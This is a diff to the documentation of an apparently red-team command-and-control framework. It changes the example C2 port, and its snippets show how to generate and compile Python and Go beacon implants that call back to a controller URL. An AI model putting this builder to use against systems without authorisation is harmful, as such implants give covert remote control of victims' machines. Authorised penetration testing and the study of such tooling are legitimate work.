@@ -41,7 +41,7 @@ All beacons support these task types:
 
 | Token | Replaced with |
 |-------|---------------|
-| `URSA_C2_URL` | C2 server URL, e.g. `http://10.0.0.1:8443` |
+| `URSA_C2_URL` | C2 server URL, e.g. `http://10.0.0.1:6708` |
 | `URSA_INTERVAL` | Beacon interval in seconds, e.g. `5` |
 | `URSA_JITTER` | Jitter factor 0.0–1.0, e.g. `0.1` |
 
@@ -49,12 +49,12 @@ All beacons support these task types:
 from implants.builder import Builder, PayloadConfig
 
 # Python payload
-cfg = PayloadConfig(c2_url="http://10.0.0.1:8443", template="http_python")
+cfg = PayloadConfig(c2_url="http://10.0.0.1:6708", template="http_python")
 source = Builder().build(cfg)
 
 # Go payload — build and compile in one step
 cfg = PayloadConfig(
-    c2_url="http://10.0.0.1:8443",
+    c2_url="http://10.0.0.1:6708",
     template="http_go",
     post_build="go build -o {binary} {output}",
 )
@@ -65,10 +65,10 @@ src_path, binary_path = Builder().build_and_compile(cfg, Path("/tmp/agent.go"))
 
 ```bash
 python -m implants.builder list                        # List available templates
-python -m implants.builder build --c2 http://10.0.0.1:8443
+python -m implants.builder build --c2 http://10.0.0.1:6708
 python -m implants.builder build \
     --template http_go \
-    --c2 http://10.0.0.1:8443 \
+    --c2 http://10.0.0.1:6708 \
     --output /tmp/agent.go \
     --post-build "go build -o {binary} {output}"
 ```
@@ -99,7 +99,7 @@ Add arbitrary key-value substitutions for your own template variables:
 
 ```python
 cfg = PayloadConfig(
-    c2_url="http://10.0.0.1:8443",
+    c2_url="http://10.0.0.1:6708",
     extra_tokens={"URSA_SLEEP_CMD": "ping -n 5 localhost"},
 )
 ```
